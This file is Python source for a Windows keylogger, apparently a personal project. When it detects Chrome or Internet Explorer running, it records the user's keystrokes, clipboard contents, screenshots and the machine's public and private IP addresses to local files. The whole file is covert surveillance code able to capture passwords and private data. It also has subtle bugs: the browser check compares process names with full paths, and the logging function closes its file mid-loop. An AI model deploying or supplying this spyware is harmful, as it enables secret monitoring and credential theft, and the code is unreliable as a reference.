###################### IMPORTS ###############################

import socket
import win32clipboard

from pynput.keyboard import Key, Listener
from requests import get

from PIL import ImageGrab

import psutil

import time

##############################################################

clipboard_info = "clipboard.txt"
system_info = "sysinfo.txt"
key_info = "keylog.txt"

file_path = r"C:\Users\Mair\Documents\GitHub\keylogger\Python"
extend = r"\\"

count = 0
keys = []

# left vague on purpose, depending on system different apps would be available on root
vulnerable_apps = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                   r"C:\Program Files\Internet Explorer\iexplore.exe"]


def is_app_running(app_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == app_name.lower():
            return True
    return False

def any_app_running(app_list):
    for app in app_list:
        if is_app_running(app):
            return True
    return False

def computer_info():
    with open(file_path + extend + system_info, 'a') as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("public IP: " + public_ip)
        except Exception:
            f.write("Not a public IP address")

        f.write("Private IP address: " + ip_address + '\n')

def copy_clipboard():
    with open(file_path + extend + clipboard_info, 'a') as f:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        f.write("Clipboard: \n" + pasted_data)

def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + 'screenshot.png')

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_files(keys)
        keys = []

def write_files(keys):
    with open(file_path + extend + key_info, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("enter") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    
while True:
    if any_app_running(vulnerable_apps):
        computer_info()
        copy_clipboard()
        screenshot()

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    
    time.sleep(5)







